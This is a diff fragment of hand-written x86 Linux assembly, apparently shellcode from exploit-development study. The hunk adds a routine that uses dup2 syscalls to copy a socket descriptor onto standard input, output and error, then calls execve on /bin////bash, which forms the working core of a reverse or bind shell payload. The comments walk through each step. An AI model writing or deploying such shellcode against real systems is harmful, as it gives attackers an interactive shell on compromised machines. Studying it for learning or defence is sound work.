@@ -72,12 +72,47 @@ connector:
 
 redirect_fd:
 
+	; once again, we'll use dub2()
 	;
-	;
-	;
+	; int dup2(int oldfd, int newfd)
 	;
 
 
+	xor ebx, ebx
+	mov ebx, edi		; sockfd
+	mov ecx, eax		; 0 for std in
+	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
+	int 0x80		; call it
+	inc ecx			; 1 for std out
+	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
+	int 0x80		; call it
+	inc ecx			; 2 for std error
+	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
+	int 0x80		; call it
+
+shell_time:
+
+	; now it's time to launch our shell
+	; program using execve. I prefer
+	; /bin/bash we'll use /bin////bash
+	; execve is 0xb (11)
+	; int execve(const char *filename, char *const argv[],
+        ;          char *const envp[])
+
+
+	xor eax, eax	; clean out eax
+	push eax	; need a null byte for execve parameters
+	push 0x68736162	; hsab
+	push 0x2f2f2f2f	; ////
+	push 0x6e69622f	; nib/ 
+	xor ebx, ebx	; clean out ebx, though may be unnecessary
+	mov ebx, esp	; save stack pointer in ebx
+	push eax	; push another null onto stack
+	mov edx, esp	; 0x00hsab////nib/0x00
+	push ebx	; points to 0x00hsab////nib/
+	mov ecx, esp	; store pointer to 0x00hsab////nib/ into ecx
+	mov al, 0xb	; execve
+	int 0x80	; call it	
 
 
 
